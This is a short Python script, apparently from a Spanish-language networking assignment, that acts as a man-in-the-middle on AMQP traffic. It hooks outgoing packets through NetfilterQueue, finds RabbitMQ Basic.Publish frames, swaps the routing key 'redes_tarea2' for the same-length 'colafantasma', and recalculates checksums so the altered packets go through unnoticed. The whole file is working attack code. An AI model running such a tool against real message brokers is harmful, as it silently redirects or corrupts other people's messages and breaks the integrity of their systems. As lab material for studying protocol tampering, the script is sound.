#!/usr/bin/env python3
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

ORIGINAL = b"redes_tarea2"
FALSA    = b"colafantasma"   # MISMA longitud (12 bytes)

assert len(ORIGINAL) == len(FALSA), f"ERROR: longitudes distintas {len(ORIGINAL)} vs {len(FALSA)}"

contador = 0

def callback(paquete):
    global contador
    pkt = IP(paquete.get_payload())
    if pkt.haslayer(Raw):
        carga = bytes(pkt[Raw].load)
        # Solo el frame Basic.Publish: clase 60 (0x3C) metodo 40 (0x28)
        if ORIGINAL in carga and b"\x3c\x00\x28" in carga:
            pkt[Raw].load = carga.replace(ORIGINAL, FALSA, 1)
            del pkt[IP].len, pkt[IP].chksum, pkt[TCP].chksum  # recalcular
            paquete.set_payload(bytes(pkt))
            contador += 1
            print(f"[!] #{contador} Routing-Key modificada: '{ORIGINAL.decode()}' -> '{FALSA.decode()}'")
    paquete.accept()

print("[*] MITM activo en OUTPUT chain...")
print("[*] Esperando Basic.Publish para modificar Routing-Key...")
nfq = NetfilterQueue()
nfq.bind(1, callback)
try:
    nfq.run()
except KeyboardInterrupt:
    print(f"\n[*] MITM detenido. Total de modificaciones: {contador}")
    nfq.unbind()
